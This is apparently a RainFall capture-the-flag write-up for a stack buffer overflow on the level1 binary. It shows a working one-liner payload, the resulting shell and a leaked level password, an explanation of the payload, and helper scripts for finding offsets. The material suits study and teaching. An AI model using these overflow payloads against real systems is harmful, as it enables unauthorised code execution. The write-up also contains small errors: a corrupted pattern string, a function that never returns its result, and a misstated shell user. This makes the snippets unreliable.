level1@RainFall:~$ (python -c 'import sys, struct; sys.stdout.write("A" * 76 + struct.pack("<I", 0x08048444)); sys.stdout.flush()'; cat) | ./level1

Good... Wait what?
./pass
/bin/sh: 1: ./pass: Permission denied
whoami
level2
cat /home/user/level2/.pass            
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77





📘 Buffer Overflow Exploit 
This exploit demonstrates a classic stack buffer overflow vulnerability

⚠️ Vulnerability Summary
The level1 binary uses the unsafe gets() function.

gets() does not check the size of the buffer, so a long enough input can overwrite the return address.

The program contains a user-defined run() function at address 0x08048444 that calls system("/bin/sh"), granting shell access.

By overflowing the buffer and overwriting the return address with the address of run(), we can make the program jump to run() instead of returning normally.

🛠 Exploit Breakdown
Here is the full command:
(python -c 'import sys, struct; sys.stdout.write("A" * 76 + struct.pack("<I", 0x08048444)); sys.stdout.flush()'; cat) | ./level1
Let’s break it down step-by-step:

🔸 (python -c '...'; cat) | ./level1
This runs a Python one-liner, followed by cat, and pipes the output into ./level1.

cat keeps the standard input open — this is sometimes needed if the program continues reading input after gets().

🔸 'import sys, struct; ...'
sys lets us write raw bytes to stdout.

struct is used to convert an integer address into raw binary in little-endian format (required by x86 architecture).

🔸 "A" * 76
Sends 76 A characters (hex 0x41) to fill the buffer and reach the return address.

The number 76 was determined by trial and error or using GDB to find where the return address starts.

🔸 struct.pack("<I", 0x08048444)
Packs the address of run() (0x08048444) into 4 bytes in little-endian format.

Little-endian means the bytes are ordered least significant byte first, so this becomes \x44\x84\x04\x08.

🔸 sys.stdout.write(...)
Writes the payload ("A" * 76 + run() address) as raw binary output (no newline or encoding issues).

🔸 sys.stdout.flush()
Ensures all output is immediately sent to the program (./level1) — otherwise the buffer may not be written in time.

✅ What Happens When You Run It
The program allocates a buffer on the stack.

gets() reads our input, filling the buffer.

After 76 bytes, we overwrite the saved return address with the address of run().

When main() returns, it jumps to run() instead of the normal exit routine.

run() executes system("/bin/sh"), spawning a shell.

You now have an interactive shell as the level1 user.



To generate a unique string of size 100 that helps identify the offset when a crash occurs (like in buffer overflow), you can use a pattern string often used in exploit development (similar to Metasploit's pattern_create.rb).

Here’s a Python one-liner to generate a unique, non-repeating string of size 100:


```python3 -c 'import itertools; print("".join("".join(x) for x in itertools.product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"))[:100])'```


```Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9```


Here's a small JavaScript program that:

1.Takes a unique pattern string (like the one you generated).

2.Accepts a hex value from the segmentation fault (like 0x37634136).

3.Converts the hex value to ASCII in little-endian order.

4.Searches for that decoded string in the pattern and returns the index.


```function hexToAsciiLittleEndian(hex) {
  // Remove '0x' if present and pad to 8 chars
  hex = hex.replace(/^0x/, '').padStart(8, '0');

  // Break into bytes, reverse (little endian), convert to chars
  let ascii = '';
  for (let i = 0; i < 8; i += 2) {
    const byte = hex.slice(i, i + 2);
    ascii = String.fromCharCode(parseInt(byte, 16)) + ascii;
  }
  return ascii;
}

function findPatternOffset(pattern, hexValue) {
  const search = hexToAsciiLittleEndian(hexValue);
  const index = pattern.indexOf(search);

  console.log(index)
}

// Example usage:
const pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9";
const hexEIP = "0x37634136"; // Example EIP value from crash

const result = findPatternOffset(pattern, hexEIP);```